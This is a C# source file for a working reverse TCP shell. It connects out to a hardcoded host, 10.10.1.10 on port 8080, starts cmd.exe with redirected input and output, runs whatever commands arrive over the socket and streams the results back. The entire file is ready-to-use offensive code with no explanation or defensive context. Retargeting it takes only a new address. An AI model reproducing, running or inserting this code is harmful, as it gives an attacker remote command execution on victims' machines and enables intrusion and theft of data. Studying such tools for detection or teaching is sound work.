using System;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Diagnostics;

public class ReverseTCPShell
{
    public static TcpClient tcpClient;
    public static NetworkStream stream;
    public static StreamReader streamReader;
    public static StreamWriter streamWriter;
    public static StringBuilder UserInput;

    public static void Main(string[] args)
    {
        tcpClient = new TcpClient();
        UserInput = new StringBuilder();

        if (!tcpClient.Connected)
        {
            try
            {
                tcpClient.Connect("10.10.1.10", 8080);
                stream = tcpClient.GetStream();
                streamReader = new StreamReader(stream, System.Text.Encoding.Default);
                streamWriter = new StreamWriter(stream, System.Text.Encoding.Default);
            }
            catch (Exception)
            {
                return;
            }

            Process CmdProc;
            CmdProc = new Process();

            CmdProc.StartInfo.FileName = "cmd.exe";
            CmdProc.StartInfo.UseShellExecute = false;
            CmdProc.StartInfo.RedirectStandardInput = true;
            CmdProc.StartInfo.RedirectStandardOutput = true;
            CmdProc.StartInfo.RedirectStandardError = true;

            CmdProc.OutputDataReceived += new DataReceivedEventHandler(SortOutputHandler);
            CmdProc.ErrorDataReceived += new DataReceivedEventHandler(SortOutputHandler);

            CmdProc.Start();
            CmdProc.BeginOutputReadLine();
            CmdProc.BeginErrorReadLine();

            while (true)
            {
                try
                {
                    UserInput.Append(streamReader.ReadLine());
                    CmdProc.StandardInput.WriteLine(UserInput);
                    UserInput.Remove(0, UserInput.Length);
                }
                catch (Exception)
                {
                    streamReader.Close();
                    streamWriter.Close();
                    CmdProc.Kill();
                    break;
                }
            }
        }
    }

    public static void SortOutputHandler(object sendingProcess, DataReceivedEventArgs outLine)
    {
        StringBuilder strOutput = new StringBuilder();

        if (!String.IsNullOrEmpty(outLine.Data))
        {
            try
            {
                strOutput.Append(outLine.Data);
                streamWriter.WriteLine(strOutput);
                streamWriter.Flush();
            }
            catch (Exception) { }
        }
    }
}
